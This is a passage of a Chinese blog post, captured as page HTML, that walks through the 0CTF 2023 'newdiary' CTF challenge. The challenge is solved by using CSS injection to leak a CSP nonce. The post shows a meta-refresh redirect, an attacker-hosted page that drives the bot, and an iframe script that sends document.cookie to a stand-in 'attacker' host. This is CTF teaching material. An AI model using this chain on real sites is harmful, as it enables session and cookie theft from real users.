class="sh">'</span><span class="s">yq6</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">q6w</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">5mc</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">c80</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">4v1</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">ysy</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">0ny</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">yys</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">ai4</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">090</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">v09</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">nyy</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">mc3</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">hkk</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">qhk</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">vf5</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">kzv</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">wc8</span><span class="sh">'</span><span class="p">}</span>
+</code></pre></div></div>
+<p>这样一来，只需要较少的请求就可以获取完整的字符串。</p>
+
+<h2 id="0ctf-2023-newdiary">0CTF 2023 newdiary</h2>
+<p>前几天的 0CTF 2023 newdiary 这道题就是考察的 CSS 注入的利用。</p>
+
+<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231212200326.png" alt="20231212200326" /></p>
+
+<p>题目设定了一个 XSS 的场景，用户可以发布内容并分享给后台 bot，bot 的 cookie 设定为 FLAG，因此我们需要通过 XSS 获取到 FLAG。</p>
+
+<p>题目没有进行 XSS 的过滤，但设定了 CSP，即使能够插入 js 代码，由于无法确认 nonce 值，代码也无法执行。</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="nt">&lt;meta</span> <span class="na">http-equiv=</span><span class="s">"Content-Security-Policy"</span>
+      <span class="na">content=</span><span class="s">"script-src 'nonce-qhkkzvf5mc3iv090nyysyq6wc80ai4v1'; frame-src 'none'; object-src 'none'; base-uri 'self'; style-src 'unsafe-inline' https://unpkg.com"</span><span class="nt">&gt;</span>
+</code></pre></div></div>
+<p>但 CSP style-src 设置为 ‘unsafe-inline’ https://unpkg.com”，允许内联执行，并信任来自 unpkg.com 的 css，所以这道题的思路就是利用 css 注入来窃取 nonce 值。</p>
+
+<p>利用步骤如下：</p>
+<ol>
+  <li>新建一个笔记 redirect，id 为 0，内容如下，该 payload 可以达成重定向的效果。在无法使用 js 时，可以通过 mata 来完成重定向，meta 标签通常不会被过滤。
+    <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;meta</span> <span class="na">http-equiv=</span><span class="s">"refresh"</span> <span class="na">content=</span><span class="s">"0.0;url=http://192.168.137.98:8888/index.html"</span><span class="nt">&gt;</span> 
+</code></pre></div>    </div>
+    <p>其中 index.html 内容如下：</p>
+    <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="cp">&lt;!DOCTYPE html&gt;</span>
+ <span class="nt">&lt;html</span> <span class="na">lang=</span><span class="s">"en"</span><span class="nt">&gt;</span>
+ <span class="nt">&lt;head&gt;</span>
+     <span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"UTF-8"</span><span class="nt">&gt;</span>
+     <span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"viewport"</span> <span class="na">content=</span><span class="s">"width=device-width, initial-scale=1.0"</span><span class="nt">&gt;</span>
+     <span class="nt">&lt;title&gt;</span>Document<span class="nt">&lt;/title&gt;</span>
+ <span class="nt">&lt;/head&gt;</span>
+ <span class="nt">&lt;body&gt;</span>
+        
+     <span class="nt">&lt;script&gt;</span>
+         <span class="kd">const</span> <span class="nx">sleep</span> <span class="o">=</span> <span class="p">(</span><span class="nx">milliseconds</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="k">new</span> <span class="nc">Promise</span><span class="p">(</span><span class="nx">resolve</span> <span class="o">=&gt;</span> <span class="nf">setTimeout</span><span class="p">(</span><span class="nx">resolve</span><span class="p">,</span> <span class="nx">milliseconds</span><span class="p">));</span>
+         <span class="k">async</span> <span class="kd">function</span> <span class="nf">run</span><span class="p">(){</span>
+             <span class="nx">bot_window</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">http://localhost/share/read#id=1&amp;username=</span><span class="dl">"</span><span class="p">);</span> <span class="c1">// Exploit 1, leak nonce</span>
+             <span class="k">await</span> <span class="nf">sleep</span><span class="p">(</span><span class="mi">7000</span><span class="p">);</span>
+
+             <span class="nx">bot_window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://localhost/share/read#id=2&amp;username=</span><span class="dl">"</span><span class="p">;</span> <span class="c1">// Exploit 2, leak cookie</span>
+             <span class="k">await</span> <span class="nf">sleep</span><span class="p">(</span><span class="mi">100</span><span class="p">);</span>
+             <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">O</span><span class="dl">"</span><span class="p">);</span>
+         <span class="p">}</span>
+         <span class="nf">run</span><span class="p">();</span>
+     <span class="nt">&lt;/script&gt;</span>
+ <span class="nt">&lt;/body&gt;</span>
+ <span class="nt">&lt;/html&gt;</span>
+</code></pre></div>    </div>
+    <p>其主要功能是让 bot 通过 window.open 打开新的标签，然后访问 id=1 的笔记。等待一段时间后，再重定向到 id=2 的笔记。</p>
+  </li>
+  <li>新建一个笔记 steal，id 为 1,内容为窃取 nonce 值的 css 脚本。由于题目信任来自 unpkg.com 的 css 文件，我们可以先将泄露 nonce 值的 css 上传到 unpkg.com 中。
+    <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">href=</span><span class="s">"http://unpkg.com/xxx/leak.css"</span><span class="nt">&gt;&lt;input</span> <span class="nt">/&gt;</span>
+</code></pre></div>    </div>
+  </li>
+  <li>当 bot 访问 id=0 的笔记时，会被重定向到攻击者页面，打开新的标签页，访问 id=1 的笔记。接着加载 leak.css 泄流出 id=1 页面的 nonce 值。此时 bot 进入等待时间。</li>
+  <li>枚举到 nonce 值后，新建一个笔记 flag，id 为 2，写入获取 cookie 值的 payload，nonce 值为刚才窃取到的值
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> &lt;iframe <span class="nv">name</span><span class="o">=</span>asd <span class="nv">srcdoc</span><span class="o">=</span><span class="s2">"&lt;script nonce=xxxx &gt;top.location='http://attacker/flag?flag='+encodeURI(document['cookie'])&lt;/script&gt;"</span>/&gt;
+</code></pre></div>    </div>
+    <p>因为页面设置了 script-src 为 nonce，禁止了 js 脚本的内联执行，因此这里使用 iframe 打开子窗口来加载 js 代码。</p>
+  </li>
+  <li>bot 结束等待时间，访问 id=2 的页面，执行 js 代码将 cookie 发送到远程。</li>
+</ol>
+
+<p>这里需要注意的是，页面的重定向（刷新）通常会导致 nonce 值发生变化，但题目环境是通过 url 中的 hash 值（# 之后的部分）来更新页面内容的，nonce 值有一个特点，# 之后的部分改变时，nonce 值不会发生变化，这也是这道题的一个关键点。</p>
+
+<p>题目 payload 可参考：<a href="https://github.com/salvatore-abello/CTF-Writeups/blob/main/0ctf%20-%202023/newdiary/README.md">CTF-Writeups/0ctf - 2023/newdiary/README.md at main · salvatore-abello/CTF-Writeups</a></p>
+
+<p>使用时注意将 index.html 放在 tempalte 目录下。启动 server.py 后，访问 /exploit。</p>
+
+<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231212203249.png" alt="20231212203249" /></p>
+
+<h1 id="参考">参考</h1>
+<ul>
+  <li><a href="https://github.com/salvatore-abello/CTF-Writeups/blob/main/0ctf%20-%202023/newdiary/README.md">CTF-Writeups/0ctf - 2023/newdiary/README.md at main · salvatore-abello/CTF-Writeups</a></li>
+  <li><a href="https://aszx87410.github.io/beyond-xss/">Beyond XSS</a></li>
+</ul>
+</div><section class="article__sharing d-print-none"></section><div class="d-print-none"><footer class="article__footer"><meta itemprop="dateModified" content="2023-12-12T18:29:48+08:00"><!-- start custom article footer snippet -->
+
+<!-- end custom article footer snippet -->
+<div class="article__subscribe"><div class="subscribe"><i class="fas fa-rss"></i> <a type="application/rss+xml" href="/feed.xml">Subscribe</a></div>
+</div><div class="article__license"><div class="license">
+    <p>This work is licensed under a <a itemprop="license" rel="license" href="https://creativecommons.org/licenses/by-nc/4.0/">Attribution-NonCommercial 4.0 International</a> license.
+      <a rel="license" href="https://creativecommons.org/licenses/by-nc/4.0/">
+        <img alt="Attribution-NonCommercial 4.0 International" src="https://i.creativecommons.org/l/by-nc/4.0/88x31.png" />
+      </a>
+    </p>
+  </div></div></footer>
+<div class="article__section-navigator clearfix"><div class="previous"><span>PREVIOUS</span><a href="/ctf/2023/12/11/0CTF-2023-Mathexam-Writeup.html">0CTF/TCTF 2023 Mathexam Writeup</a></div></div></div>
+
+</div>
+
+<script>(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    $(function() {
+      var $this ,$scroll;
+      var $articleContent = $('.js-article-content');
+      var hasSidebar = $('.js-page-root').hasClass('layout--page--sidebar');
+      var scroll = hasSidebar ? '.js-page-main' : 'html, body';
+      $scroll = $(scroll);
+
+      $articleContent.find('.highlight').each(function() {
+        $this = $(this);
+        $this.attr('data-lang', $this.find('code').attr('data-lang'));
+      });
+      $articleContent.find('h1[id], h2[id], h3[id], h4[id], h5[id], h6[id]').each(function() {
+        $this = $(this);
+        $this.append($('<a class="anchor d-print-none" aria-hidden="true"></a>').html('<i class="fas fa-anchor"></i>'));
+      });
+      $articleContent.on('click', '.anchor', function() {
+        $scroll.scrollToAnchor('#' + $(this).parent().attr('id'), 400);
+      });
+    });
+  });
+})();
+</script>
+</div><section class="page__comments d-print-none"></section></article><!-- start custom main bottom snippet -->
+
+<!-- end custom main bottom snippet -->
+</div>
+            </div></div></div><div class="page__footer d-print-none">
+<footer class="footer py-4 js-page-footer">
+  <div class="main"><div itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="DumKiy"><meta itemprop="url" content="/"><meta itemprop="description" content="Watch And Learn."><div class="footer__author-links"><div class="author-links">
+  <ul class="menu menu--nowrap menu--inline"><li title="Follow me on Github.">
+        <a class="button button--circle github-button" itemprop="sameAs" href="https://github.com/DummyKitty" target="_blank">
+          <div class="icon"><svg fill="#000000" width="24px" height="24px" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path class="svgpath" data-index="path_0" fill="#272636" d="M0 525.2c0 223.6 143.3 413.7 343 483.5 26.9 6.8 22.8-12.4 22.8-25.4l0-88.7c-155.3 18.2-161.5-84.6-172-101.7-21.1-36-70.8-45.2-56-62.3 35.4-18.2 71.4 4.6 113.1 66.3 30.2 44.7 89.1 37.2 119 29.7 6.5-26.9 20.5-50.9 39.7-69.6C248.8 728.2 181.7 630 181.7 513.2c0-56.6 18.7-108.7 55.3-150.7-23.3-69.3 2.2-128.5 5.6-137.3 66.5-6 135.5 47.6 140.9 51.8 37.8-10.2 80.9-15.6 129.1-15.6 48.5 0 91.8 5.6 129.8 15.9 12.9-9.8 77-55.8 138.8-50.2 3.3 8.8 28.2 66.7 6.3 135 37.1 42.1 56 94.6 56 151.4 0 117-67.5 215.3-228.8 243.7 26.9 26.6 43.6 63.4 43.6 104.2l0 128.8c0.9 10.3 0 20.5 17.2 20.5C878.1 942.4 1024 750.9 1024 525.3c0-282.9-229.3-512-512-512C229.1 13.2 0 242.3 0 525.2L0 525.2z" />
+</svg>
+</div>
+        </a>
+      </li></ul>
+</div>
+</div>
+    </div><div class="site-info mt-2">
+      <div>© DumKiy's blog 2021,
+        Powered by <a title="Jekyll is a simple, blog-aware, static site generator." href="http://jekyllrb.com/">Jekyll</a> & <a
+        title="TeXt is a super customizable Jekyll theme." href="https://github.com/kitian616/jekyll-TeXt-theme">TeXt Theme</a>.
+      </div>
+    </div>
+  </div>
+</footer>
+</div></div>
+    </div><script>(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    var $body = $('body'), $window = $(window);
+    var $pageRoot = $('.js-page-root'), $pageMain = $('.js-page-main');
+    var activeCount = 0;
+    function modal(options) {
+      var $root = this, visible, onChange, hideWhenWindowScroll = false;
+      var scrollTop;
+      function setOptions(options) {
+        var _options = options || {};
+        visible = _options.initialVisible === undefined ? false : show;
+        onChange = _options.onChange;
+        hideWhenWindowScroll = _options.hideWhenWindowScroll;
+      }
+      function init() {
+        setState(visible);
+      }
+      function setState(isShow) {
+        if (isShow === visible) {
+          return;
+        }
+        visible = isShow;
+        if (visible) {
+          activeCount++;
+          scrollTop = $(window).scrollTop() || $pageMain.scrollTop();
+          $root.addClass('modal--show');
+          $pageMain.scrollTop(scrollTop);
+          activeCount === 1 && ($pageRoot.addClass('show-modal'), $body.addClass('of-hidden'));
+          hideWhenWindowScroll && window.hasEvent('touchstart') && $window.on('scroll', hide);
+          $window.on('keyup', handleKeyup);
+        } else {
+          activeCount > 0 && activeCount--;
+          $root.removeClass('modal--show');
+          $window.scrollTop(scrollTop);
+          activeCount === 0 && ($pageRoot.removeClass('show-modal'), $body.removeClass('of-hidden'));
+          hideWhenWindowScroll && window.hasEvent('touchstart') && $window.off('scroll', hide);
+          $window.off('keyup', handleKeyup);
+        }
+        onChange && onChange(visible);
+      }
+      function show() {
+        setState(true);
+      }
+      function hide() {
+        setState(false);
+      }
+      function handleKeyup(e) {
+        // Char Code: 27  ESC
+        if (e.which ===  27) {
+          hide();
+        }
+      }
+      setOptions(options);
+      init();
+      return {
+        show: show,
+        hide: hide,
+        $el: $root
+      };
+    }
+    $.fn.modal = modal;
+  });
+})();
+</script><div class="modal modal--overflow page__search-modal d-print-none js-page-search-modal"><script>
+(function () {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    // search panel
+    var search = (window.search || (window.search = {}));
+    var useDefaultSearchBox = window.useDefaultSearchBox === undefined ?
+      true : window.useDefaultSearchBox ;
+
+    var $searchModal = $('.js-page-search-modal');
+    var $searchToggle = $('.js-search-toggle');
+    var searchModal = $searchModal.modal({ onChange: handleModalChange, hideWhenWindowScroll: true });
+    var modalVisible = false;
+    search.searchModal = searchModal;
+
+    var $searchBox = null;
+    var $searchInput = null;
+    var $searchClear = null;
+
+    function getModalVisible() {
+      return modalVisible;
+    }
+    search.getModalVisible = getModalVisible;
+
+    function handleModalChange(visible) {
+      modalVisible = visible;
+      if (visible) {
+        search.onShow && search.onShow();
+        useDefaultSearchBox && $searchInput[0] && $searchInput[0].focus();
+      } else {
+        search.onShow && search.onHide();
+        useDefaultSearchBox && $searchInput[0] && $searchInput[0].blur();
+        setTimeout(function() {
+          useDefaultSearchBox && ($searchInput.val(''), $searchBox.removeClass('not-empty'));
+          search.clear && search.clear();
+          window.pageAsideAffix && window.pageAsideAffix.refresh();
+        }, 400);
+      }
+    }
+
+    $searchToggle.on('click', function() {
+      modalVisible ? searchModal.hide() : searchModal.show();
+    });
+    // Char Code: 83  S, 191 /
+    $(window).on('keyup', function(e) {
+      if (!modalVisible && !window.isFormElement(e.target || e.srcElement) && (e.which === 83 || e.which === 191)) {
+        modalVisible || searchModal.show();
+      }
+    });
+
+    if (useDefaultSearchBox) {
+      $searchBox = $('.js-search-box');
+      $searchInput = $searchBox.children('input');
+      $searchClear = $searchBox.children('.js-icon-clear');
+      search.getSearchInput = function() {
+        return $searchInput.get(0);
+      };
+      search.getVal = function() {
+        return $searchInput.val();
+      };
+      search.setVal = function(val) {
+        $searchInput.val(val);
+      };
+
+      $searchInput.on('focus', function() {
+        $(this).addClass('focus');
+      });
+      $searchInput.on('blur', function() {
+        $(this).removeClass('focus');
+      });
+      $searchInput.on('input', window.throttle(function() {
+        var val = $(this).val();
+        if (val === '' || typeof val !== 'string') {
+          search.clear && search.clear();
+        } else {
+          $searchBox.addClass('not-empty');
+          search.onInputNotEmpty && search.onInputNotEmpty(val);
+        }
+      }, 400));
+      $searchClear.on('click', function() {
+        $searchInput.val(''); $searchBox.removeClass('not-empty');
+        search.clear && search.clear();
+      });
+    }
+  });
+})();
+</script><div class="search search--dark">
+  <div class="main">
+    <div class="search__header">Search</div>
+    <div class="search-bar">
+      <div class="search-box js-search-box">
+        <div class="search-box__icon-search"><i class="fas fa-search"></i></div>
+        <input type="text" />
+        <div class="search-box__icon-clear js-icon-clear">
+          <a><i class="fas fa-times"></i></a>
+        </div>
+      </div>
+      <button class="button button--theme-dark button--pill search__cancel js-search-toggle">
+        Cancel</button>
+    </div>
+    <div class="search-result js-search-result"></div>
+  </div>
+</div>
+<script>var SOURCES = window.TEXT_VARIABLES.sources;
+var PAHTS = window.TEXT_VARIABLES.paths;
+window.Lazyload.js([SOURCES.jquery, PAHTS.search_js], function() {
+  var search = (window.search || (window.search = {}));
+  var searchData = window.TEXT_SEARCH_DATA || {};
+
+  function memorize(f) {
+    var cache = {};
+    return function () {
+      var key = Array.prototype.join.call(arguments, ',');
+      if (key in cache) return cache[key];
+      else return cache[key] = f.apply(this, arguments);
+    };
+  }
+
+  /// search
+  function searchByQuery(query) {
+    var i, j, key, keys, cur, _title, result = {};
+    keys = Object.keys(searchData);
+    for (i = 0; i < keys.length; i++) {
+      key = keys[i];
+      for (j = 0; j < searchData[key].length; j++) {
+        cur = searchData[key][j], _title = cur.title;
+        if ((result[key] === undefined || result[key] && result[key].length < 4 )
+          && _title.toLowerCase().indexOf(query.toLowerCase()) >= 0) {
+          if (result[key] === undefined) {
+            result[key] = [];
+          }
+          result[key].push(cur);
+        }
+      }
+    }
+    return result;
+  }
+
+  var renderHeader = memorize(function(header) {
+    return $('<p class="search-result__header">' + header + '</p>');
+  });
+
+  var renderItem = function(index, title, url) {
+    return $('<li class="search-result__item" data-index="' + index + '"><a class="button" href="' + url + '">' + title + '</a></li>');
+  };
+
+  function render(data) {
+    if (!data) { return null; }
+    var $root = $('<ul></ul>'), i, j, key, keys, cur, itemIndex = 0;
+    keys = Object.keys(data);
+    for (i = 0; i < keys.length; i++) {
+      key = keys[i];
+      $root.append(renderHeader(key));
+      for (j = 0; j < data[key].length; j++) {
+        cur = data[key][j];
+        $root.append(renderItem(itemIndex++, cur.title, cur.url));
+      }
+    }
+    return $root;
+  }
+
+  // search box
+  var $result = $('.js-search-result'), $resultItems;
+  var lastActiveIndex, activeIndex;
+
+  function clear() {
+    $result.html(null);
+    $resultItems = $('.search-result__item'); activeIndex = 0;
+  }
+  function onInputNotEmpty(val) {
+    $result.html(render(searchByQuery(val)));
+    $resultItems = $('.search-result__item'); activeIndex = 0;
+    $resultItems.eq(0).addClass('active');
+  }
+
+  search.clear = clear;
+  search.onInputNotEmpty = onInputNotEmpty;
+
+  function updateResultItems() {
+    lastActiveIndex >= 0 && $resultItems.eq(lastActiveIndex).removeClass('active');
+    activeIndex >= 0 && $resultItems.eq(activeIndex).addClass('active');
+  }
+
+  function moveActiveIndex(direction) {
+    var itemsCount = $resultItems ? $resultItems.length : 0;
+    if (itemsCount > 1) {
+      lastActiveIndex = activeIndex;
+      if (direction === 'up') {
+        activeIndex = (activeIndex - 1 + itemsCount) % itemsCount;
+      } else if (direction === 'down') {
+        activeIndex = (activeIndex + 1 + itemsCount) % itemsCount;
+      }
+      updateResultItems();
+    }
+  }
+
+  // Char Code: 13  Enter, 37  ⬅, 38  ⬆, 39  ➡, 40  ⬇
+  $(window).on('keyup', function(e) {
+    var modalVisible = search.getModalVisible && search.getModalVisible();
+    if (modalVisible) {
+      if (e.which === 38) {
+        modalVisible && moveActiveIndex('up');
+      } else if (e.which === 40) {
+        modalVisible && moveActiveIndex('down');
+      } else if (e.which === 13) {
+        modalVisible && $resultItems && activeIndex >= 0 && $resultItems.eq(activeIndex).children('a')[0].click();
+      }
+    }
+  });
+
+  $result.on('mouseover', '.search-result__item > a', function() {
+    var itemIndex = $(this).parent().data('index');
+    itemIndex >= 0 && (lastActiveIndex = activeIndex, activeIndex = itemIndex, updateResultItems());
+  });
+});
+</script>
+</div></div>
+
+
+<script>(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    function scrollToAnchor(anchor, duration, callback) {
+      var $root = this;
+      $root.animate({ scrollTop: $(anchor).position().top }, duration, function() {
+        window.history.replaceState(null, '', window.location.href.split('#')[0] + anchor);
+        callback && callback();
+      });
+    }
+    $.fn.scrollToAnchor = scrollToAnchor;
+  });
+})();
+(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    function affix(options) {
+      var $root = this, $window = $(window), $scrollTarget, $scroll,
+        offsetBottom = 0, scrollTarget = window, scroll = window.document, disabled = false, isOverallScroller = true,
+        rootTop, rootLeft, rootHeight, scrollBottom, rootBottomTop,
+        hasInit = false, curState;
+
+      function setOptions(options) {
+        var _options = options || {};
+        _options.offsetBottom && (offsetBottom = _options.offsetBottom);
+        _options.scrollTarget && (scrollTarget = _options.scrollTarget);
+        _options.scroll && (scroll = _options.scroll);
+        _options.disabled !== undefined && (disabled = _options.disabled);
+        $scrollTarget = $(scrollTarget);
+        isOverallScroller = window.isOverallScroller($scrollTarget[0]);
+        $scroll = $(scroll);
+      }
+      function preCalc() {
+        top();
+        rootHeight = $root.outerHeight();
+        rootTop = $root.offset().top + (isOverallScroller ? 0 :  $scrollTarget.scrollTop());
+        rootLeft = $root.offset().left;
+      }
+      function calc(needPreCalc) {
+        needPreCalc && preCalc();
+        scrollBottom = $scroll.outerHeight() - offsetBottom - rootHeight;
+        rootBottomTop = scrollBottom - rootTop;
+      }
+      function top() {
+        if (curState !== 'top') {
+          $root.removeClass('fixed').css({
+            left: 0,
+            top: 0
+          });
+          curState = 'top';
+        }
+      }
+      function fixed() {
+        if (curState !== 'fixed') {
+          $root.addClass('fixed').css({
+            left: rootLeft + 'px',
+            top: 0
+          });
+          curState = 'fixed';
+        }
+      }
+      function bottom() {
+        if (curState !== 'bottom') {
+          $root.removeClass('fixed').css({
+            left: 0,
+            top: rootBottomTop + 'px'
+          });
+          curState = 'bottom';
+        }
+      }
+      function setState() {
+        var scrollTop = $scrollTarget.scrollTop();
+        if (scrollTop >= rootTop && scrollTop <= scrollBottom) {
+          fixed();
+        } else if (scrollTop < rootTop) {
+          top();
+        } else {
+          bottom();
+        }
+      }
+      function init() {
+        if(!hasInit) {
+          var interval, timeout;
+          calc(true); setState();
+          // run calc every 100 millisecond
+          interval = setInterval(function() {
+            calc();
+          }, 100);
+          timeout = setTimeout(function() {
+            clearInterval(interval);
+          }, 45000);
+          window.pageLoad.then(function() {
+            setTimeout(function() {
+              clearInterval(interval);
+              clearTimeout(timeout);
+            }, 3000);
+          });
+          $scrollTarget.on('scroll', function() {
+            disabled || setState();
+          });
+          $window.on('resize', function() {
+            disabled || (calc(true), setState());
+          });
+          hasInit = true;
+        }
+      }
+
+      setOptions(options);
+      if (!disabled) {
+        init();
+      }
+      $window.on('resize', window.throttle(function() {
+        init();
+      }, 200));
+      return {
+        setOptions: setOptions,
+        refresh: function() {
+          calc(true, { animation: false }); setState();
+        }
+      };
+    }
+    $.fn.affix = affix;
+  });
+})();
+(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    function toc(options) {
+      var $root = this, $window = $(window), $scrollTarget, $scroller, $tocUl = $('<ul class="toc toc--ellipsis"></ul>'), $tocLi, $headings, $activeLast, $activeCur,
+        selectors = 'h1,h2,h3', container = 'body', scrollTarget = window, scroller = 'html, body', disabled = false,
+        headingsPos, scrolling = false, hasRendered = false, hasInit = false;
+
+      function setOptions(options) {
+        var _options = options || {};
+        _options.selectors && (selectors = _options.selectors);
+        _options.container && (container = _options.container);
+        _options.scrollTarget && (scrollTarget = _options.scrollTarget);
+        _options.scroller && (scroller = _options.scroller);
+        _options.disabled !== undefined && (disabled = _options.disabled);
+        $headings = $(container).find(selectors).filter('[id]');
+        $scrollTarget = $(scrollTarget);
+        $scroller = $(scroller);
+      }
+      function calc() {
+        headingsPos = [];
+        $headings.each(function() {
+          headingsPos.push(Math.floor($(this).position().top));
+        });
+      }
+      function setState(element, disabled) {
+        var scrollTop = $scrollTarget.scrollTop(), i;
+        if (disabled || !headingsPos || headingsPos.length < 1) { return; }
+        if (element) {
+          $activeCur = element;
+        } else {
+          for (i = 0; i < headingsPos.length; i++) {
+            if (scrollTop >= headingsPos[i]) {
+              $activeCur = $tocLi.eq(i);
+            } else {
+              $activeCur || ($activeCur = $tocLi.eq(i));
+              break;
+            }
+          }
+        }
+        $activeLast && $activeLast.removeClass('active');
+        ($activeLast = $activeCur).addClass('active');
+      }
+      function render() {
+        if(!hasRendered) {
+          $root.append($tocUl);
+          $headings.each(function() {
+            var $this = $(this);
+            $tocUl.append($('<li></li>').addClass('toc-' + $this.prop('tagName').toLowerCase())
+              .append($('<a></a>').text($this.text()).attr('href', '#' + $this.prop('id'))));
+          });
+          $tocLi = $tocUl.children('li');
+          $tocUl.on('click', 'a', function(e) {
+            e.preventDefault();
+            var $this = $(this);
+            scrolling = true;
+            setState($this.parent());
+            $scroller.scrollToAnchor($this.attr('href'), 400, function() {
+              scrolling = false;
+            });
+          });
+        }
+        hasRendered = true;
+      }
+      function init() {
+        var interval, timeout;
+        if(!hasInit) {
+          render(); calc(); setState(null, scrolling);
+          // run calc every 100 millisecond
+          interval = setInterval(function() {
+            calc();
+          }, 100);
+          timeout = setTimeout(function() {
+            clearInterval(interval);
+          }, 45000);
+          window.pageLoad.then(function() {
+            setTimeout(function() {
+              clearInterval(interval);
+              clearTimeout(timeout);
+            }, 3000);
+          });
+          $scrollTarget.on('scroll', function() {
+            disabled || setState(null, scrolling);
+          });
+          $window.on('resize', window.throttle(function() {
+            if (!disabled) {
+              render(); calc(); setState(null, scrolling);
+            }
+          }, 100));
+        }
+        hasInit = true;
+      }
+
+      setOptions(options);
+      if (!disabled) {
+        init();
+      }
+      $window.on('resize', window.throttle(function() {
+        init();
+      }, 200));
+      return {
+        setOptions: setOptions
+      };
+    }
+    $.fn.toc = toc;
+  });
+})();
+/*(function () {
+
+})();*/
+</script><script>
+  /* toc must before affix, since affix need to konw toc' height. */(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  var TOC_SELECTOR = window.TEXT_VARIABLES.site.toc.selectors;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    var $window = $(window);
+    var $articleContent = $('.js-article-content');
+    var $tocRoot = $('.js-toc-root'), $col2 = $('.js-col-aside');
+    var toc;
+    var tocDisabled = false;
+    var hasSidebar = $('.js-page-root').hasClass('layout--page--sidebar');
+    var hasToc = $articleContent.find(TOC_SELECTOR).length > 0;
+
+    function disabled() {
+      return $col2.css('display') === 'none' || !hasToc;
+    }
+
+    tocDisabled = disabled();
+
+    toc = $tocRoot.toc({
+      selectors: TOC_SELECTOR,
+      container: $articleContent,
+      scrollTarget: hasSidebar ? '.js-page-main' : null,
+      scroller: hasSidebar ? '.js-page-main' : null,
+      disabled: tocDisabled
+    });
+
+    $window.on('resize', window.throttle(function() {
+      tocDisabled = disabled();
+      toc && toc.setOptions({
+        disabled: tocDisabled
+      });
+    }, 100));
+
+  });
+})();
+(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    var $window = $(window), $pageFooter = $('.js-page-footer');
+    var $pageAside = $('.js-page-aside');
+    var affix;
+    var tocDisabled = false;
+    var hasSidebar = $('.js-page-root').hasClass('layout--page--sidebar');
+
+    affix = $pageAside.affix({
+      offsetBottom: $pageFooter.outerHeight(),
+      scrollTarget: hasSidebar ? '.js-page-main' : null,
+      scroller: hasSidebar ? '.js-page-main' : null,
+      scroll: hasSidebar ? $('.js-page-main').children() : null,
+      disabled: tocDisabled
+    });
+
+    $window.on('resize', window.throttle(function() {
+      affix && affix.setOptions({
+        disabled: tocDisabled
+      });
+    }, 100));
+
+    window.pageAsideAffix = affix;
+  });
+})();
+</script><script>
+  window.Lazyload.js(['https://cdn.bootcss.com/jquery/3.1.1/jquery.min.js', 'https://cdn.bootcss.com/Chart.js/2.7.2/Chart.bundle.min.js'], function() {
+    var $canvas = null, $this = null, _ctx = null, _text = '';
+    $('.language-chart').each(function(){
+      $this = $(this);
+      $canvas = $('<canvas></canvas>');
+      _text = $this.text();
+      $this.text('').append($canvas);
+      _ctx = $canvas.get(0).getContext('2d');
+      (_ctx && _text) && (new Chart(_ctx, JSON.parse(_text)) && $this.attr('data-processed', true));
+    });
+  });
+</script>
+<script type="text/x-mathjax-config">
+	var _config = { tex2jax: {
+		inlineMath: [['$','$'], ['\\(','\\)']]
+	}};_config.TeX = { equationNumbers: { autoNumber: "all" } };MathJax.Hub.Config(_config);
+</script>
+<script type="text/javascript" src="https://cdn.bootcss.com/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+<script>
